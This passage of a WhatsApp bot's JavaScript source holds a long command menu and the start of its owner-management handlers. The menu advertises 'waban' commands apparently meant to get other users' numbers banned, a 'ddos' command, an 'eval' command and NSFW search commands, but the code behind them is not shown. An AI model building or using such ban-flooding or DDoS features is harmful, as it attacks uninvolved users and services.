┃━ ${MenuStyle}   ${prefix}ʟᴇᴀʀɴ_ᴄᴏᴅɪɴɢ || ᴄᴏᴅɪɴɢ

╰═══════════════════
${readmore}

╭━━━  *𝗢𝗪𝗡𝗘𝗥 & 𝗔𝗗𝗠𝗜𝗡* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ <number>
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟᴏᴡɴᴇʀ <number>
┃━ ${MenuStyle}   ${prefix}ᴀᴅᴅsᴜᴅᴏ || sᴇᴛsᴜᴅᴏ <number>
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟsᴜᴅᴏ <number>
┃━ ${MenuStyle}   ${prefix}ʟɪsᴛsᴜᴅᴏ
┃━ ${MenuStyle}   ${prefix}ᴀᴅᴅᴘʀᴇᴍ <number>
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟᴘʀᴇᴍ <number>
┃━ ${MenuStyle}   ${prefix}ʙᴀɴ <@user/number>
┃━ ${MenuStyle}   ${prefix}ᴜɴʙᴀɴ <@user/number>
┃━ ${MenuStyle}   ${prefix}ʟɪsᴛʙᴀɴ
┃━ ${MenuStyle}   ${prefix}ʙᴀɴᴄʜᴀᴛ
┃━ ${MenuStyle}   ${prefix}ᴜɴʙᴀɴᴄʜᴀᴛ
┃━ ${MenuStyle}   ${prefix}ʙʟᴏᴄᴋ <number>
┃━ ${MenuStyle}   ${prefix}ᴜɴʙʟᴏᴄᴋ <number>
┃━ ${MenuStyle}   ${prefix}ʟɪsᴛʙʟᴏᴄᴋᴇᴅ
┃━ ${MenuStyle}   ${prefix}sᴇᴛᴘᴘ <reply image>
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟᴘᴘ
┃━ ${MenuStyle}   ${prefix}sᴇᴛɴᴀᴍᴇ <text>
┃━ ${MenuStyle}   ${prefix}sᴇᴛʙɪᴏ <text>
┃━ ${MenuStyle}   ${prefix}ᴊᴏɪɴ <link>
┃━ ${MenuStyle}   ${prefix}ᴊᴏɪɴᴄʜ <channel link>
┃━ ${MenuStyle}   ${prefix}ʟᴇᴀᴠᴇ || ʟᴇғᴛ
┃━ ${MenuStyle}   ${prefix}ʙʀᴏᴀᴅᴄᴀsᴛ <text>
┃━ ${MenuStyle}   ${prefix}sᴀᴠᴇ <reply media>
┃━ ${MenuStyle}   ${prefix}ᴜᴘsᴡ <reply media>
┃━ ${MenuStyle}   ${prefix}ᴜᴘᴅᴀᴛᴇ
┃━ ${MenuStyle}   ${prefix}ᴘᴀɪʀ <number>
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟᴘᴀɪʀ <number>
┃━ ${MenuStyle}   ${prefix}sᴇɴᴅɢᴄʟɪɴᴋ <number>
┃━ ${MenuStyle}   ${prefix}ᴇᴠᴀʟ <code>
┃━ ${MenuStyle}   ${prefix}ʀᴇᴀᴄᴛᴄʜ <link/id> <emoji>

╰═══════════════════
${readmore}

╭━━━  *𝗕𝗢𝗧 𝗖𝗢𝗡𝗙𝗜𝗚* ━━━╮

┃━ ${MenuStyle}   ${prefix}sʜᴜᴛᴅᴏᴡɴ
┃━ ${MenuStyle}   ${prefix}ʀᴇsᴛᴀʀᴛ || ʀᴇʙᴏᴏᴛ
┃━ ${MenuStyle}   ${prefix}ᴘ-sᴛᴀᴛᴜs
┃━ ${MenuStyle}   ${prefix}ʟᴏɢᴏᴜᴛ
┃━ ${MenuStyle}   ${prefix}sᴇᴛᴘʀᴇғɪx <symbol>
┃━ ${MenuStyle}   ${prefix}sᴇᴛʙᴏᴛɪᴍɢ <link>
┃━ ${MenuStyle}   ${prefix}sᴇᴛᴀʟɪᴠᴇ <text>
┃━ ${MenuStyle}   ${prefix}sᴛᴀʀᴛᴜᴘᴍsɢ <on/off>
┃━ ${MenuStyle}   ${prefix}sᴇᴛ-ᴛɪᴍᴇᴢᴏɴᴇ <zone>
┃━ ${MenuStyle}   ${prefix}ᴘᴜʙʟɪᴄ
┃━ ${MenuStyle}   ${prefix}sᴇʟғ || ᴘʀɪᴠᴀᴛᴇ
┃━ ${MenuStyle}   ${prefix}ᴍᴏᴅᴇ <group/private/off>
┃━ ${MenuStyle}   ${prefix}ᴀᴜᴛᴏᴛʏᴘɪɴɢ <on/off>
┃━ ${MenuStyle}   ${prefix}ᴀᴜᴛᴏʀᴇᴄᴏʀᴅɪɴɢ <on/off>
┃━ ${MenuStyle}   ${prefix}ᴀᴜᴛᴏʀᴇᴀᴅ <on/off>
┃━ ${MenuStyle}   ${prefix}ᴀᴜᴛᴏʀᴇᴀᴄᴛ <on/off>
┃━ ${MenuStyle}   ${prefix}ᴀᴜᴛᴏsᴛᴀᴛᴜsᴠɪᴇᴡ <on/off>

╰═══════════════════
${readmore}

╭━━━  *𝗚𝗥𝗢𝗨𝗣 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 * ━━━╮

┃━ ${MenuStyle}   ${prefix}ɢᴄsᴛᴀᴛᴜs || ᴜᴘsᴡɢᴄ
┃━ ${MenuStyle}   ${prefix}ᴀᴅᴅ <number>
┃━ ${MenuStyle}   ${prefix}ᴋɪᴄᴋ <@user/number/country code>
┃━ ${MenuStyle}   ${prefix}ᴘʀᴏᴍᴏᴛᴇ <@user>
┃━ ${MenuStyle}   ${prefix}ᴅᴇᴍᴏᴛᴇ <@user>
┃━ ${MenuStyle}   ${prefix}ᴋɪᴄᴋᴀʟʟ
┃━ ${MenuStyle}   ${prefix}ᴋɪᴄᴋᴀᴅᴍɪɴs
┃━ ${MenuStyle}   ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
┃━ ${MenuStyle}   ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ
┃━ ${MenuStyle}   ${prefix}ᴀᴘᴘʀᴏᴠᴇᴀʟʟ
┃━ ${MenuStyle}   ${prefix}ᴛᴀɢᴀʟʟ <text>
┃━ ${MenuStyle}   ${prefix}ʜɪᴅᴇᴛᴀɢ <text>
┃━ ${MenuStyle}   ${prefix}ᴛᴀɢᴀᴅᴍɪɴ
┃━ ${MenuStyle}   ${prefix}ᴡᴇʟᴄᴏᴍᴇ <on/off>
┃━ ${MenuStyle}   ${prefix}ɢᴏᴏᴅʙʏᴇ <on/off>
┃━ ${MenuStyle}   ${prefix}ɢʀᴏᴜᴘ-ᴇᴠᴇɴᴛs <on/off>
┃━ ${MenuStyle}   ${prefix}ʟɪsᴛᴏɴʟɪɴᴇ
┃━ ${MenuStyle}   ${prefix}ɢᴄʟɪɴᴋ
┃━ ${MenuStyle}   ${prefix}ʀᴇsᴇᴛɢᴄʟɪɴᴋ || ʀᴇᴠᴏᴋᴇ
┃━ ${MenuStyle}   ${prefix}ɢʀᴏᴜᴘɪᴅ
┃━ ${MenuStyle}   ${prefix}sᴇᴛᴘᴘɢʀᴏᴜᴘ <reply image>
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟᴘᴘɢʀᴏᴜᴘ
┃━ ${MenuStyle}   ${prefix}ᴄʀᴇᴀᴛᴇɢᴄ <name>
┃━ ${MenuStyle}   ${prefix}ɢᴇᴛɢᴄɪɴғᴏ <link>
┃━ ${MenuStyle}   ${prefix}ᴍᴜᴛᴇ
┃━ ${MenuStyle}   ${prefix}ᴜɴᴍᴜᴛᴇ
┃━ ${MenuStyle}   ${prefix}ᴄʟᴏsᴇᴛɪᴍᴇ <number> <unit>
┃━ ${MenuStyle}   ${prefix}ᴏᴘᴇɴᴛɪᴍᴇ <number> <unit>
┃━ ${MenuStyle}   ${prefix}sᴇᴛᴡᴀʀɴ <number>
┃━ ${MenuStyle}   ${prefix}ʀᴇsᴇᴛᴡᴀʀɴ <@user/number>
┃━ ${MenuStyle}   ${prefix}ᴄʜᴇᴄᴋᴡᴀʀɴ <@user/none>
┃━ ${MenuStyle}   ${prefix}ᴀɴᴛɪʟɪɴᴋ <warn/delete/kick/off>
┃━ ${MenuStyle}   ${prefix}ᴀɴᴛɪᴛᴀɢ <on/off>
┃━ ${MenuStyle}   ${prefix}ᴀɴᴛɪʙᴏᴛ <warn/delete/kick/off>
┃━ ${MenuStyle}   ${prefix}ᴀɴᴛɪᴅᴇʟᴇᴛᴇ <on/off>
┃━ ${MenuStyle}   ${prefix}ᴀɴᴛɪʙᴀᴅᴡᴏʀᴅ <warn/delete/kick/off>

╰═══════════════════
${readmore}

╭━━━  *𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗥* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴘʟᴀʏ <query>
┃━ ${MenuStyle}   ${prefix}ᴘʟᴀʏᴅᴏᴄ <query>
┃━ ${MenuStyle}   ${prefix}ᴠɪᴅᴇᴏ || ʏᴛᴠɪᴅᴇᴏ <query>
┃━ ${MenuStyle}   ${prefix}ʏᴛᴍᴘ3 || ʏᴛᴀᴜᴅɪᴏ
┃━ ${MenuStyle}   ${prefix}ʏᴛᴍᴘ4 || ʏᴛᴠɪᴅᴇᴏ
┃━ ${MenuStyle}   ${prefix}ʏᴛᴍᴘ3ᴅᴏᴄ <link/query>
┃━ ${MenuStyle}   ${prefix}ʏᴛᴍᴘ4ᴅᴏᴄ <link/query>
┃━ ${MenuStyle}   ${prefix}ʏᴛs || ʏᴛsᴇᴀʀᴄʜ <query>
┃━ ${MenuStyle}   ${prefix}ʟʏʀɪᴄs <song>
┃━ ${MenuStyle}   ${prefix}ᴛɪᴋᴛᴏᴋ || ᴛᴛ <link>
┃━ ${MenuStyle}   ${prefix}ᴛɪᴋᴛᴏᴋᴍᴘ3 <link>
┃━ ${MenuStyle}   ${prefix}ᴛɪᴋ-ɪᴍɢ <link>
┃━ ${MenuStyle}   ${prefix}ᴛᴛsᴇᴀʀᴄʜ <query>
┃━ ${MenuStyle}   ${prefix}ɪɴsᴛᴀɢʀᴀᴍ || ɪɢ <link>
┃━ ${MenuStyle}   ${prefix}ғᴀᴄᴇʙᴏᴏᴋ || ғʙ <link>
┃━ ${MenuStyle}   ${prefix}ᴛᴡɪᴛᴛᴇʀᴅʟ || xᴅʟ <url/link>
┃━ ${MenuStyle}   ${prefix}ɢɪᴛᴄʟᴏɴᴇ <link>
┃━ ${MenuStyle}   ${prefix}ᴍᴇᴅɪᴀғɪʀᴇ <link>
┃━ ${MenuStyle}   ${prefix}ᴘɪɴᴛᴅʟ <link>
┃━ ${MenuStyle}   ${prefix}ᴀᴘᴋ <app name>
┃━ ${MenuStyle}   ${prefix}ɢᴅʀɪᴠᴇ <link>
┃━ ${MenuStyle}   ${prefix}sᴜʙᴛɪᴛʟᴇ <movie name>
┃━ ${MenuStyle}   ${prefix}sᴜʙᴛɪᴛʟᴇsᴇᴀʀᴄʜ <movie name>

╰═══════════════════
${readmore}

╭━━━  *𝗔𝗜 & 𝗜𝗠𝗔𝗚𝗘* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴀɪ <query>
┃━ ${MenuStyle}   ${prefix}ᴀɪ2 <query>
┃━ ${MenuStyle}   ${prefix}ɢᴘᴛ4 <query>
┃━ ${MenuStyle}   ${prefix}ᴏᴘᴇɴᴀɪ <query>
┃━ ${MenuStyle}   ${prefix}xᴀɪ <query>
┃━ ${MenuStyle}   ${prefix}ɢᴇᴍɪɴɪ <query>
┃━ ${MenuStyle}   ${prefix}ᴍᴇᴛᴀ-ᴀɪ <query>
┃━ ${MenuStyle}   ${prefix}ᴄᴏᴘɪʟᴏᴛ <query>
┃━ ${MenuStyle}   ${prefix}ᴊᴇᴅᴇɴ <query>
┃━ ${MenuStyle}   ${prefix}sᴇᴛᴘᴇʀsᴏɴᴀ <query>
┃━ ${MenuStyle}   ${prefix}sᴇᴛᴘᴇʀsᴏɴᴀ2 || sᴇᴛᴍᴏᴅᴇ <option>
┃━ ${MenuStyle}   ${prefix}ɢᴘᴛɪᴍᴀɢᴇ <query>
┃━ ${MenuStyle}   ${prefix}ʀᴇᴍɪɴɪ || ʜᴅ <reply image>
┃━ ${MenuStyle}   ${prefix}sᴛɪᴄᴋᴇʀ || s <reply media>
┃━ ${MenuStyle}   ${prefix}ᴇᴍᴏᴊɪᴍɪx <emoji+emoji>
┃━ ${MenuStyle}   ${prefix}ᴛᴀᴋᴇ || sᴛᴇᴀʟ <pack|author>
┃━ ${MenuStyle}   ${prefix}ʙʀᴀᴛ <text>
┃━ ${MenuStyle}   ${prefix}ǫᴄ <text>

╰═══════════════════
${readmore}

╭━━━  *𝗨𝗧𝗜𝗟𝗜𝗧𝗬 & 𝗧𝗢𝗢𝗟𝗦* ━━━╮

┃━ ${MenuStyle}   ${prefix}sᴀʏ || ᴛᴛs <text>
┃━ ${MenuStyle}   ${prefix}ᴛʀᴀɴsʟᴀᴛᴇ || ᴛʀ <reply text>
┃━ ${MenuStyle}   ${prefix}ᴛᴏᴜʀʟ <reply media>
┃━ ${MenuStyle}   ${prefix}ᴛᴏɪᴍɢ <reply sticker>
┃━ ${MenuStyle}   ${prefix}ᴛᴏᴍᴘ3 || ᴛᴏᴀᴜᴅɪᴏ
┃━ ${MenuStyle}   ${prefix}ᴛᴏᴍᴘ4 || ᴛᴏᴠɪᴅᴇᴏ
┃━ ${MenuStyle}   ${prefix}ᴛᴏɢɪғ <reply sticker>
┃━ ${MenuStyle}   ${prefix}ᴛᴏᴅᴏᴄ <filename>
┃━ ${MenuStyle}   ${prefix}ᴛᴏᴠɴ <reply media>
┃━ ${MenuStyle}   ${prefix}ᴛᴏᴠᴠ <reply media>
┃━ ${MenuStyle}   ${prefix}ᴠᴠ <reply viewonce>
┃━ ${MenuStyle}   ${prefix}ᴠᴠ2 <reply viewonce>
┃━ ${MenuStyle}   ${prefix}ᴠᴏʟᴀᴜᴅɪᴏ || ᴀᴜᴅɪᴏᴠᴏʟᴜᴍᴇ
┃━ ${MenuStyle}   ${prefix}ᴠᴏʟᴠɪᴅᴇᴏ || ᴠɪᴅᴇᴏᴠᴏʟᴜᴍᴇ
┃━ ${MenuStyle}   ${prefix}ʀᴜɴᴄᴏᴅᴇ
┃━ ${MenuStyle}   ${prefix}ʀᴇᴀᴅᴍᴏʀᴇ <text1|text2>
┃━ ${MenuStyle}   ${prefix}ᴄʜᴇᴄᴋᴍᴀɪʟ
┃━ ${MenuStyle}   ${prefix}ssᴡᴇʙ <link>
┃━ ${MenuStyle}   ${prefix}ɢᴇᴛ <link/url>
┃━ ${MenuStyle}   ${prefix}ǫʀᴄᴏᴅᴇ <text/link>
┃━ ${MenuStyle}   ${prefix}ᴄʜᴇᴄᴋᴡᴇʙ <url>
┃━ ${MenuStyle}   ${prefix}ʀᴇᴀᴅǫʀ <reply qr img>
┃━ ${MenuStyle}   ${prefix}sᴛʏʟᴇ || ғᴀɴᴄʏ <text>
┃━ ${MenuStyle}   ${prefix}ᴄᴀʟᴄᴜʟᴀᴛᴏʀ <expression>
┃━ ${MenuStyle}   ${prefix}ᴍᴏʀsᴇ || ᴍᴏʀsᴇᴄᴏᴅᴇ <>
┃━ ${MenuStyle}   ${prefix}ᴍᴅᴛᴏʜᴛᴍʟ <markdown>
┃━ ${MenuStyle}   ${prefix}ᴜʀʟɪɴғᴏ || ʟɪɴᴋɪɴғᴏ <link/url>
┃━ ${MenuStyle}   ${prefix}ᴅᴇᴛᴇᴄᴛ || ɪsᴀɪᴛᴇxᴛ <text>
┃━ ${MenuStyle}   ${prefix}ᴘᴀssᴡᴏʀᴅᴄʜᴇᴄᴋ || ᴘᴀssᴄʜᴇᴄᴋ <password>
┃━ ${MenuStyle}   ${prefix}ᴍʏᴊɪᴅ
┃━ ${MenuStyle}   ${prefix}ɢᴇᴛɴᴀᴍᴇ <reply msg>
┃━ ${MenuStyle}   ${prefix}ɢᴇᴛᴘᴘ <@user>
┃━ ${MenuStyle}   ${prefix}ɢᴇᴛᴅᴇᴠɪᴄᴇ <reply msg>
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟᴇᴛᴇ <reply msg>
┃━ ${MenuStyle}   ${prefix}ғᴏʀᴡᴀʀᴅ || ғᴡʀᴅ <jid>
┃━ ${MenuStyle}   ${prefix}ᴀʀᴄʜɪᴠᴇ
┃━ ${MenuStyle}   ${prefix}ᴜɴᴀʀᴄʜɪᴠᴇ
┃━ ${MenuStyle}   ${prefix}ᴘɪɴᴄʜᴀᴛ
┃━ ${MenuStyle}   ${prefix}ᴜɴᴘɪɴᴄʜᴀᴛ
┃━ ${MenuStyle}   ${prefix}sᴇᴛᴄᴍᴅ <reply sticker> <cmd>
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟᴄᴍᴅ <reply sticker>
┃━ ${MenuStyle}   ${prefix}ʟɪsᴛᴄᴍᴅ

╰═══════════════════
${readmore}

╭━━━  *𝗘𝗖𝗢𝗡𝗢𝗠𝗬* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴇᴄᴏɴᴏᴍʏ <on/off>
┃━ ${MenuStyle}   ${prefix}ʙᴀʟ || ᴡᴀʟʟᴇᴛ
┃━ ${MenuStyle}   ${prefix}ᴅᴀɪʟʏ
┃━ ${MenuStyle}   ${prefix}ᴡᴏʀᴋ
┃━ ${MenuStyle}   ${prefix}ᴅᴇᴘᴏsɪᴛ <amount/all>
┃━ ${MenuStyle}   ${prefix}ᴡɪᴛʜᴅʀᴀᴡ <amount/all>
┃━ ${MenuStyle}   ${prefix}ɢɪᴠᴇ || ᴘᴀʏ <@user> <amount>
┃━ ${MenuStyle}   ${prefix}ʀᴏʙ <@user>
┃━ ${MenuStyle}   ${prefix}ɢᴀᴍʙʟᴇ || ʙᴇᴛ <amount>
┃━ ${MenuStyle}   ${prefix}ʟʙ || ᴛᴏᴘ <limit>
┃━ ${MenuStyle}   ${prefix}sʜᴏᴘ
┃━ ${MenuStyle}   ${prefix}ʙᴜʏ <item name/number>
┃━ ${MenuStyle}   ${prefix}ɪɴᴠ || ɪɴᴠᴇɴᴛᴏʀʏ

╰═══════════════════
${readmore}

╭━━━  *𝗦𝗘𝗔𝗥𝗖𝗛* ━━━╮

┃━ ${MenuStyle}   ${prefix}ɢᴏᴏɢʟᴇ <query>
┃━ ${MenuStyle}   ${prefix}ᴡɪᴋɪᴘᴇᴅɪᴀ <query>
┃━ ${MenuStyle}   ${prefix}ɴᴘᴍsᴇᴀʀᴄʜ <package>
┃━ ${MenuStyle}   ${prefix}ɴᴘᴍsᴛᴀʟᴋ <package>
┃━ ${MenuStyle}   ${prefix}ᴘɪɴᴛᴇʀᴇsᴛ <query>
┃━ ${MenuStyle}   ${prefix}ᴘɪxᴀʙᴀʏ <query>
┃━ ${MenuStyle}   ${prefix}ᴅɪᴄᴛɪᴏɴᴀʀʏ <word>
┃━ ${MenuStyle}   ${prefix}ᴅᴇғɪɴᴇ <word>
┃━ ${MenuStyle}   ${prefix}ᴍᴏᴠɪᴇ <title>
┃━ ${MenuStyle}   ${prefix}ʙᴏᴏᴋ <title>
┃━ ${MenuStyle}   ${prefix}ʀᴇᴄɪᴘᴇ <dish name>
┃━ ${MenuStyle}   ${prefix}ʀᴇᴄɪᴘᴇ-ɪɴɢʀᴇᴅɪᴇɴᴛ <name>
┃━ ${MenuStyle}   ${prefix}ᴡᴇᴀᴛʜᴇʀ <city>
┃━ ${MenuStyle}   ${prefix}ɪᴘɪɴғᴏ || ᴛʀᴀᴄᴋ-ɪᴘ <ip/domain>
┃━ ${MenuStyle}   ${prefix}ᴍʏɪᴘ
┃━ ${MenuStyle}   ${prefix}ʙɪʙʟᴇ <reference>
┃━ ${MenuStyle}   ${prefix}ǫᴜʀᴀɴ <reference>
┃━ ${MenuStyle}   ${prefix}ᴇʟᴇᴍᴇɴᴛ <name>
┃━ ${MenuStyle}   ${prefix}ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ <username>
┃━ ${MenuStyle}   ${prefix}sʜᴀᴢᴀᴍ || ғɪɴᴅ <reply audio>
┃━ ${MenuStyle}   ${prefix}ɪᴍᴅʙ || ᴍᴏᴠɪᴇɪɴғᴏ <movie/series name>

╰═══════════════════
${readmore}

╭━━━  *𝗙𝗨𝗡 & 𝗚𝗔𝗠𝗘𝗦* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴍᴇᴍᴇ
┃━ ${MenuStyle}   ${prefix}ᴊᴏᴋᴇ
┃━ ${MenuStyle}   ${prefix}ᴅᴀᴅᴊᴏᴋᴇ
┃━ ${MenuStyle}   ${prefix}ᴅᴇᴠ-ᴊᴏᴋᴇ
┃━ ${MenuStyle}   ${prefix}ғᴀᴄᴛ
┃━ ${MenuStyle}   ${prefix}ᴋᴀᴏᴍᴏᴊɪ || sᴇᴍᴏᴊɪ <option>
┃━ ${MenuStyle}   ${prefix}ᴡʜᴇɴ
┃━ ${MenuStyle}   ${prefix}ᴡʜᴇʀᴇ
┃━ ${MenuStyle}   ${prefix}ᴡʜᴀᴛ
┃━ ${MenuStyle}   ${prefix}ʜᴏᴡ
┃━ ${MenuStyle}   ${prefix}ʀᴀᴛᴇ
┃━ ${MenuStyle}   ${prefix}ᴄᴏᴜᴘʟᴇ
┃━ ${MenuStyle}   ${prefix}sᴏᴜʟᴍᴀᴛᴇ
┃━ ${MenuStyle}   ${prefix}ғᴜɴғᴀᴄᴛ
┃━ ${MenuStyle}   ${prefix}ᴛʀᴜᴛʜ
┃━ ${MenuStyle}   ${prefix}ᴅᴀʀᴇ
┃━ ${MenuStyle}   ${prefix}ǫᴜᴏᴛᴇ
┃━ ${MenuStyle}   ${prefix}ᴘɪᴄᴋᴜᴘʟɪɴᴇ || ʀɪᴢᴢ
┃━ ${MenuStyle}   ${prefix}ɪɴsᴜʟᴛ || ʀᴏᴀsᴛ <@user>
┃━ ${MenuStyle}   ${prefix}ʙʀᴇᴀᴋᴜᴘʟ
┃━ ${MenuStyle}   ${prefix}ᴄʜᴇᴄᴋᴍᴇ
┃━ ${MenuStyle}   ${prefix}ʜᴏʀᴏsᴄᴏᴘᴇ <sign>
┃━ ${MenuStyle}   ${prefix}8ʙᴀʟʟ <question>
┃━ ${MenuStyle}   ${prefix}ғᴏʀᴛᴜɴᴇ
┃━ ${MenuStyle}   ${prefix}ᴛᴛᴛ || ᴛɪᴄᴛᴀᴄᴛᴏᴇ
┃━ ${MenuStyle}   ${prefix}ᴅᴇʟᴛᴛᴛ
┃━ ${MenuStyle}   ${prefix}ᴡᴄɢ || ᴡᴏʀᴅᴄʜᴀɪɴ <start/stop>
┃━ ${MenuStyle}   ${prefix}ʀᴘs <choice>
┃━ ${MenuStyle}   ${prefix}ᴅɪᴄᴇ
┃━ ${MenuStyle}   ${prefix}ᴄᴏɪɴ
┃━ ${MenuStyle}   ${prefix}ɢᴜᴇss <number>

╰═══════════════════
${readmore}

╭━━━  *𝗜𝗠𝗔𝗚𝗘 𝗘𝗙𝗙𝗘𝗖𝗧𝗦* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴄᴀʀʙᴏɴ <reply text>
┃━ ${MenuStyle}   ${prefix}ᴡᴀɴᴛᴇᴅ <reply image>
┃━ ${MenuStyle}   ${prefix}ᴡᴀsᴛᴇᴅ <reply image>
┃━ ${MenuStyle}   ${prefix}ʀᴀɪɴʙᴏᴡ <reply image>
┃━ ${MenuStyle}   ${prefix}ᴛʀɪɢɢᴇʀ-ᴍᴇᴍᴇ <reply image>
┃━ ${MenuStyle}   ${prefix}ʀɪᴘ-ᴍᴇᴍᴇ <reply image>
┃━ ${MenuStyle}   ${prefix}ᴍɴᴍ <reply image>
┃━ ${MenuStyle}   ${prefix}ᴊᴀɪʟ <reply image>
┃━ ${MenuStyle}   ${prefix}ɪɴᴠᴇʀᴛ <reply image>

╰═══════════════════
${readmore}

╭━━━  *𝗔𝗡𝗜𝗠𝗘 & 𝗥𝗘𝗔𝗖𝗧𝗜𝗢𝗡𝗦* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴀɴɪᴍᴇɴᴇᴡs
┃━ ${MenuStyle}   ${prefix}ᴀɴɪᴍᴇᴄʜᴀʀ <name>
┃━ ${MenuStyle}   ${prefix}ᴀɴɪᴍᴇʀᴇᴄ <title>
┃━ ${MenuStyle}   ${prefix}ᴀɴɪᴍᴇsᴇᴀʀᴄʜ <title>
┃━ ${MenuStyle}   ${prefix}ᴀɴɪᴍᴇᴡʟᴘ
┃━ ${MenuStyle}   ${prefix}ᴄʀʏ
┃━ ${MenuStyle}   ${prefix}ᴋɪʟʟ
┃━ ${MenuStyle}   ${prefix}ʜᴜɢ
┃━ ${MenuStyle}   ${prefix}ᴘᴀᴛ
┃━ ${MenuStyle}   ${prefix}ʟɪᴄᴋ
┃━ ${MenuStyle}   ${prefix}ᴋɪss
┃━ ${MenuStyle}   ${prefix}ʙɪᴛᴇ
┃━ ${MenuStyle}   ${prefix}ʏᴇᴇᴛ
┃━ ${MenuStyle}   ${prefix}ʙᴜʟʟʏ
┃━ ${MenuStyle}   ${prefix}ʙᴏɴᴋ
┃━ ${MenuStyle}   ${prefix}ᴡɪɴᴋ
┃━ ${MenuStyle}   ${prefix}ᴘᴏᴋᴇ
┃━ ${MenuStyle}   ${prefix}ɴᴏᴍ
┃━ ${MenuStyle}   ${prefix}sʟᴀᴘ
┃━ ${MenuStyle}   ${prefix}sᴍɪʟᴇ
┃━ ${MenuStyle}   ${prefix}ᴡᴀᴠᴇ
┃━ ${MenuStyle}   ${prefix}ᴀᴡᴏᴏ
┃━ ${MenuStyle}   ${prefix}ʙʟᴜsʜ
┃━ ${MenuStyle}   ${prefix}sᴍᴜɢ
┃━ ${MenuStyle}   ${prefix}ɢʟᴏᴍᴘ
┃━ ${MenuStyle}   ${prefix}ʜᴀᴘᴘʏ
┃━ ${MenuStyle}   ${prefix}ᴅᴀɴᴄᴇ
┃━ ${MenuStyle}   ${prefix}ᴄʀɪɴɢᴇ
┃━ ${MenuStyle}   ${prefix}ᴄᴜᴅᴅʟᴇ
┃━ ${MenuStyle}   ${prefix}ʜɪɢʜғɪᴠᴇ
┃━ ${MenuStyle}   ${prefix}sʜɪɴᴏʙᴜ
┃━ ${MenuStyle}   ${prefix}ʜᴀɴᴅʜᴏʟᴅ
┃━ ${MenuStyle}   ${prefix}ғᴏx
┃━ ${MenuStyle}   ${prefix}ᴋᴏᴀʟᴀ
┃━ ${MenuStyle}   ${prefix}ʙɪʀᴅ
┃━ ${MenuStyle}   ${prefix}ᴘᴀɴᴅᴀ
┃━ ${MenuStyle}   ${prefix}ᴅᴏɢ
┃━ ${MenuStyle}   ${prefix}ᴄᴀᴛ

╰═══════════════════
${readmore}

╭━━━  *𝗡𝗦𝗙𝗪* ━━━╮

┃━ ${MenuStyle}   ${prefix}ɴsғᴡ <on/off>
┃━ ${MenuStyle}   ${prefix}ᴡᴀɪғᴜ
┃━ ${MenuStyle}   ${prefix}ʀᴡᴀɪғᴜ
┃━ ${MenuStyle}   ${prefix}ᴡᴀɪғᴜ2
┃━ ${MenuStyle}   ${prefix}ʜᴇɴᴛᴀɪ
┃━ ${MenuStyle}   ${prefix}xɴxxsᴇᴀʀᴄʜ <query>
┃━ ${MenuStyle}   ${prefix}xᴠɪᴅᴇᴏsᴇᴀʀᴄʜ <query>
┃━ ${MenuStyle}   ${prefix}ᴘᴏʀɴsᴇᴀʀᴄʜ <query>
┃━ ${MenuStyle}   ${prefix}xᴠɪᴅᴇᴏᴅʟ <link>
┃━ ${MenuStyle}   ${prefix}ᴘᴀᴘᴛᴛ

╰═══════════════════
${readmore}

╭━━━  *𝗪𝗔𝗕𝗔𝗡 & 𝗨𝗡𝗕𝗔𝗡* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴡᴀʙᴀɴᴠ1 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀʙᴀɴᴠ2 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀʙᴀɴᴠ3 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀʙᴀɴᴠ4 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀʙᴀɴᴠ5 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀʙᴀɴᴠ6 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀᴜɴʙᴀɴᴠ1 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀᴜɴʙᴀɴᴠ2 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀᴜɴʙᴀɴᴠ3 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀᴜɴʙᴀɴᴠ4 <number>
┃━ ${MenuStyle}   ${prefix}ᴡᴀᴜɴʙᴀɴᴠ5 <number>

╰══════════════════════
${readmore}

╭━━━  *𝗗𝗗𝗢𝗦 & 𝗪𝗘𝗕_𝗖𝗥𝗔𝗦𝗛* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴅᴅᴏs

╰════════════════════════

${footer}
`;
  await sendMenu(menuText);
  }
  break;
 //=================================================//
  

//=================================================//
case 'addowner': case 'addown': {
if (!isOwner) return Vreply(mess.owner) 
  if (!args[0]) return Vreply(`Useage: ${prefix + command} Example ${prefix + command} 234xxx`);  
if ((m.mentionedJid && m.mentionedJid.length> 0) || m.quoted) {
    return Vreply(usageMessage);
}   
    numero = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
     if (global.db.data.settings.owners.includes(numero)) return Vreply("Already an owner.");
  let loadnum = await HeavstalTech.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return Vreply(`Number Invalid!!!`);
      global.db.data.settings.owners.push(numero);
      global.db.data.settings.premium.push(numero); 
      await global.db.write();
  Vreply(`Succesfully added ${numero} as an owner!`);
  }
  break;
  //=================================================//


//=================================================//
case 'delowner': case 'delown': {
if (!isOwner) return Vreply(mess.owner) 
